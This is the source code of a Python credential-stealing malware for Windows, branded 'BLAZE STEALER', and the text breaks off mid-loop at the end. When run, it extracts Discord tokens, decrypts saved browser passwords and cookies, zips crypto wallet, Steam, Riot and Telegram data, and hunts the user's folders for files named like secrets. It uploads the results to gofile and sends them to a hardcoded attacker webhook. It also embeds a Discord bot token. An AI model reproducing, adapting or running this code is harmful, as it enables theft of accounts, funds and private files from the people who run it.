import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import os
import winreg
import ctypes
import sys
import random
import time
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
from discord import utils
import sys, json, ctypes, shutil, base64, sqlite3, zipfile, subprocess, discord
from os.path import isfile
from discord.ext import commands
from requests import *

from subprocess import check_output
from time import sleep
from sys import getsizeof

from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
from cryptography.hazmat.primitives.ciphers.aead import AESCCM
from cryptography.hazmat.backends import default_backend

from threading import Thread
from datetime import datetime
from urllib.request import urlopen, Request
from re import findall
import ctypes
import ctypes.wintypes
from os.path import isfile
token = "MTA3NDUyMjE0MjQzMzA5OTg5Nw.GL7RU8.yibKSgserY4Vl6lviaBzXI-hCtEoBsud-4XrQg"
global appdata
appdata = os.getenv('APPDATA')

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix='-', intents=intents)
infos = "True" 
#TOKEN GRABBER


hook = "http://blazeontop.blazeleaks.com:2095/webhooks/525500795ba4bd0853a7ee5d712be66c31ac2f22e456f483152e68954a198c08d70b24bc8b41e5c56f8f385bb29151004531d951d658cf80e1069cc9fd4941addfbcc23755de4091085c9ec2206b3de69026d4d78f6a8bfd2bfb4ffdf329cef9e8a3d61f43e44350dbacde46dd424787a4a7d339e69e4abdf68cfc39df581c585f69629cc4288a16f7d8491dbd9176c6"
DETECTED = False


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8):
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413:
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(ipdatanojson)
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    return globalinfo


def Trust(Cookies):
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{globalInfo()} | Found in `{path}`',
        "embeds": [
            {
            "color": 16711680,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": ":clown: HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@BLAZE STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png",
        "username": "BLAZE Stealer",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "BLAZE | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [Cookies.txt]({link})",
                    "color": 16711680,
                    "footer": {
                        "text": "@BLAZE STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png"
                    }
                }
            ],
            "username": "BLAZE",
            "avatar_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "BLAZE | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [Password.txt]({link})",
                    "color": 16711680,
                    "footer": {
                        "text": "@BLAZE STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png"
                    }
                }
            ],
            "username": "BLAZE",
            "avatar_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                "color": 16711680,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "BLAZE | File Stealer"
                },
                "footer": {
                    "text": "@BLAZE STEALER",
                    "icon_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png"
                }
                }
            ],
            "username": "BLAZE",
            "avatar_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return



# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--BLAZE STEALER ON TOP-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "BLAZE Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 16711680,
            "footer": {
                "text": "@BLAZE STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png"
            }
            }
        ],
        "username": "BLAZE Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1074527963728597022/1074530162730872982/logo.png",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
#     lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
#     lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    # for patt in browserPaths:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    # for patt in PathsToZip:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
